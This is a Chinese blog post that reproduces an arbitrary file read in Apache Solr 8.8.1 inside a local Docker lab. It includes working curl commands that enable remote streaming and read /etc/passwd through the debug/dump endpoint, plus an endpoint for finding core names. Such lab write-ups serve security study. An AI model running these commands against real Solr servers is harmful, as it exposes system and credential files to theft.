> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aZX_EYv5f0l_jM-XQpbHTw)

Apache Solr 在前两天爆出来了个任意文件读取漏洞，而且官方拒绝修复。所以这里就快速复现一下吧，顺便将复现时候遇到的坑也记录一下。  

01

—

环境搭建

  
第一步总是要搭环境的，所以这里为了方便选取了使用 docker。

这里以目前最新的 Apache Solr 8.8.1 为例，

首先拉取镜像，这里自动就会拉取最新的版本：

```
docker pull solr
```

启动容器：

```
docker run --name solr-8.8.1 -p 8983:8983 -itd solr
```

之后访问本地 8983 端口可以看到相关管理页面

![](https://mmbiz.qpic.cn/mmbiz_png/e9icbmGX0KNIibKH6Kb4Miaqn4TbN5sPN93MR8n4UFW3neiazG6Uv9S5E7Q1iayBmia5ibIFWibTibX7iaUqycszLgP9qZTw/640?wx_fmt=png)

但此时如果直接使用 poc 去尝试是会出现 404 的错误  

![](https://mmbiz.qpic.cn/mmbiz_png/e9icbmGX0KNIibKH6Kb4Miaqn4TbN5sPN93LYFgpTvrUNbYxsWeQr12DbHzibs4ibsumG2hdkP7vMESOvR3jfqRPKXw/640?wx_fmt=png)

这是由于 core 没安装导致，这里可以尝试安装一个 core。

![](https://mmbiz.qpic.cn/mmbiz_png/e9icbmGX0KNIibKH6Kb4Miaqn4TbN5sPN93ZqX7u2zfVmIIThlMibWzTDebeKdJVKgqJUJ0b7jeBNet0D7LhrCPYgg/640?wx_fmt=png)

但当直接添加 core 时会看到报错，这里是由于 new_core 目录下缺少配置文件，不过 solr 自带了一些默认配置文件的 sample，就是我们在首页看到的那些。

![](https://mmbiz.qpic.cn/mmbiz_png/e9icbmGX0KNIibKH6Kb4Miaqn4TbN5sPN93do8GNS7lrRvk7ldfiajDup0OsS3PuQSvw6MdWG2szf9ZianKAC3RZ50Q/640?wx_fmt=png)

可以直接将相关的配置文件拷过去使用，首先进入交互模式：

```
docker exec -it solr-8.8.1 /bin/bash
```

然后复制过去：

```
cp -r /opt/solr/server/solr/configsets/_default/conf /var/solr/data/new_core/
```

此时再 add core 就可以成功了

02

—

POC 复现‍

根据上述就完成了环境配置，

如果此时直接读文件是无法读取的。

![](https://mmbiz.qpic.cn/mmbiz_png/e9icbmGX0KNIibKH6Kb4Miaqn4TbN5sPN93hGRTRECHtwLuiacxwia2HLkuDs958jH3Agibia4BJ2kdFN8j2tibrCib73ag/640?wx_fmt=png)

这时需要先开启相关配置

```
curl -d '{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://127.0.0.1:8983/solr/your_core_name/config -H 'Content-type:application/json'
```

![](https://mmbiz.qpic.cn/mmbiz_png/e9icbmGX0KNIibKH6Kb4Miaqn4TbN5sPN93WR6qNkHWKY1p9sWQHumHZSHNd44k9orLiauUflngNcX5DrCU5DJFHiag/640?wx_fmt=png)

开启之后即可读取任意文件

```
curl "http://127.0.0.1:8983/solr/your_core_name/debug/dump?param=ContentStreams" -F "stream.url=file:///etc/passwd"
```

![](https://mmbiz.qpic.cn/mmbiz_png/e9icbmGX0KNIibKH6Kb4Miaqn4TbN5sPN93N2lQeS7iaicDNQHh8gu5qIribmQPKS3U82Bypxr7on6B0bukLTvn0gnrg/640?wx_fmt=png)

 可以看到这里是访问的我们刚才那个 core 的名字，那如何自动去获取到 core 名字呢。  

那这里的 Core name 就可以通过这个接口来查询

```
/solr/admin/cores?indexInfo=false&wt=json
```

在返回的数据中即可看到刚才创建时的 core name  

****本演示仅用于学习和研究，请在实验环境中运行，请勿用于其他任何非法用途，否则后果自负！****

  

**-------- 快上车就完事了** ****--------****

**hijackY**∣来一起共同成长

![](https://mmbiz.qpic.cn/mmbiz_jpg/e9icbmGX0KNKLYibllm0vwqLm2KFMDQ6KSSACFu3jicG1ibqMkicQpzkCPaISRMMWucJyJPgFIOHWy3lGS820p25POw/640?wx_fmt=jpeg)

识别二维码，快上车就完事了

也可 **赞赏** **转发** **在看****↘**